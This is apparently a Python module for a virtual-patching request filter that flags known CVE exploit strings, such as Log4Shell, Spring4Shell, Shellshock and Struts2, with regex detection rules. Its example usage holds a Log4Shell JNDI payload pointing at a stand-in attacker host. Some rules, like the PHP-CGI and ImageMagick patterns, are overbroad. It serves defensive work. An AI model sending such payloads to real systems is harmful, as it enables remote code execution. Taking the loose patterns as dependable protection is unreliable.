"""
Virtual Patching Engine
Quick security fixes for known vulnerabilities without changing application code
"""
from typing import Dict, List, Tuple, Optional
import re
from datetime import datetime


class VirtualPatcher:
    """Virtual patching for CVEs and zero-day vulnerabilities"""
    
    def __init__(self, config: Dict):
        self.config = config.get('virtual_patching', {})
        self.enabled = self.config.get('enabled', False)
        
        # Load patch rules
        self.rules = self.config.get('rules', [])
        
        # Compile regex patterns for performance
        self.compiled_rules = []
        for rule in self.rules:
            self.compiled_rules.append({
                'id': rule.get('id'),
                'cve': rule.get('cve'),
                'severity': rule.get('severity', 'medium'),
                'target': rule.get('target', 'any'),
                'pattern': re.compile(rule.get('pattern'), re.IGNORECASE) if rule.get('pattern') else None,
                'description': rule.get('description', '')
            })
        
        #  Built-in CVE patches
        self._load_builtin_patches()
    
    def _load_builtin_patches(self):
        """Load built-in CVE patches"""
        builtin_patches = [
            {
                'id': 'log4j-rce',
                'cve': 'CVE-2021-44228',
                'severity': 'critical',
                'target': 'headers',
                'pattern': re.compile(r'\$\{jndi:(ldap|rmi|dns)://', re.IGNORECASE),
                'description': 'Log4Shell RCE vulnerability'
            },
            {
                'id': 'spring4shell',
                'cve': 'CVE-2022-22965',
                'severity': 'critical',
                'target': 'params',
                'pattern': re.compile(r'class\.module\.classLoader', re.IGNORECASE),
                'description': 'Spring4Shell RCE'
            },
            {
                'id': 'struts-rce',
                'cve': 'CVE-2017-5638',
                'severity': 'critical',
                'target': 'headers',
                'pattern': re.compile(r'%\{.*\}', re.IGNORECASE),
                'description': 'Apache Struts2 RCE'
            },
            {
                'id': 'shellshock',
                'cve': 'CVE-2014-6271',
                'severity': 'critical',
                'target': 'headers',
                'pattern': re.compile(r'\(\)\s*\{\s*:;\s*\}', re.IGNORECASE),
                'description': 'Shellshock Bash vulnerability'
            },
            {
                'id': 'php-cgi-arg-injection',
                'cve': 'CVE-2012-1823',
                'severity': 'high',
                'target': 'params',
                'pattern': re.compile(r'-[a-z]\s', re.IGNORECASE),
                'description': 'PHP CGI argument injection'
            },
            {
                'id': 'imagemagick-rce',
                'cve': 'CVE-2016-3714',
                'severity': 'high',
                'target': 'body',
                'pattern': re.compile(r'https?:\/\/|fill|url\(', re.IGNORECASE),
                'description': 'ImageMagick ImageTragick RCE'
            }
        ]
        
        self.compiled_rules.extend(builtin_patches)
    
    def detect(self, request_data: Dict) -> Tuple[bool, int, List[str]]:
        """
        Check if request matches any virtual patch rules
        
        Args:
            request_data: Dictionary containing request data
        
        Returns:
            Tuple of (is_threat, threat_score, matched_patterns)
        """
        if not self.enabled:
            return False, 0, []
        
        matched_patterns = []
        total_score = 0
        
        # Check each rule
        for rule in self.compiled_rules:
            if not rule['pattern']:
                continue
            
            target = rule['target']
            
            # Determine what to search
            search_strings = []
            
            if target in ['any', 'headers']:
                headers = request_data.get('headers', {})
                search_strings.extend(headers.values())
            
            if target in ['any', 'params']:
                params = request_data.get('params', {})
                search_strings.extend([str(v) for v in params.values()])
            
            if target in ['any', 'body']:
                body = request_data.get('body', '')
                if isinstance(body, dict):
                    search_strings.extend([str(v) for v in body.values()])
                elif isinstance(body, str):
                    search_strings.append(body)
            
            if target in ['any', 'path']:
                path = request_data.get('path', '')
                search_strings.append(path)
            
            # Search for pattern
            for search_str in search_strings:
                if rule['pattern'].search(str(search_str)):
                    # Severity scoring
                    severity_scores = {
                        'critical': 10,
                        'high': 8,
                        'medium': 6,
                        'low': 4
                    }
                    
                    score = severity_scores.get(rule['severity'], 6)
                    total_score += score
                    
                    pattern_msg = f"Virtual Patch: {rule['description']} ({rule['cve']})"
                    matched_patterns.append(pattern_msg)
                    
                    break  # Found match for this rule, move to next rule
        
        is_threat = len(matched_patterns) > 0
        
        return is_threat, total_score, matched_patterns
    
    def add_custom_patch(self, patch_id: str, cve: str, pattern: str, 
                        target: str = 'any', severity: str = 'medium',
                        description: str = ''):
        """Add custom virtual patch"""
        rule = {
            'id': patch_id,
            'cve': cve,
            'severity': severity,
            'target': target,
            'pattern': re.compile(pattern, re.IGNORECASE),
            'description': description or f'Custom patch for {cve}'
        }
        
        self.compiled_rules.append(rule)
    
    def remove_patch(self, patch_id: str):
        """Remove a virtual patch"""
        self.compiled_rules = [r for r in self.compiled_rules if r['id'] != patch_id]
    
    def list_patches(self) -> List[Dict]:
        """List all active patches"""
        return [
            {
                'id': rule['id'],
                'cve': rule['cve'],
                'severity': rule['severity'],
                'target': rule['target'],
                'description': rule['description']
            }
            for rule in self.compiled_rules
        ]
    
    def get_stats(self) -> Dict:
        """Get virtual patching statistics"""
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        
        for rule in self.compiled_rules:
            severity = rule.get('severity', 'medium')
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        return {
            'enabled': self.enabled,
            'total_patches': len(self.compiled_rules),
            'by_severity': severity_counts
        }
    
    def get_module_info(self) -> Dict:
        """Get module information"""
        return {
            'name': 'Virtual Patcher',
            'version': '1.0.0',
            'enabled': self.enabled,
            'patches_loaded': len(self.compiled_rules),
            'builtin_patches': 6
        }


# Example usage
if __name__ == '__main__':
    config = {
        'virtual_patching': {
            'enabled': True,
            'rules': []
        }
    }
    
    patcher = VirtualPatcher(config)
    
    # Test Log4Shell
    request = {
        'method': 'GET',
        'path': '/search',
        'headers': {
            'User-Agent': '${jndi:ldap://attacker.com/evil}'
        },
        'params': {},
        'body': ''
    }
    
    is_threat, score, patterns = patcher.detect(request)
    print(f"Threat: {is_threat}, Score: {score}")
    print(f"Patterns: {patterns}")
    
    # List all patches
    patches = patcher.list_patches()
    print(f"\nLoaded patches: {len(patches)}")
    for patch in patches:
        print(f"- {patch['cve']}: {patch['description']} [{patch['severity']}]")
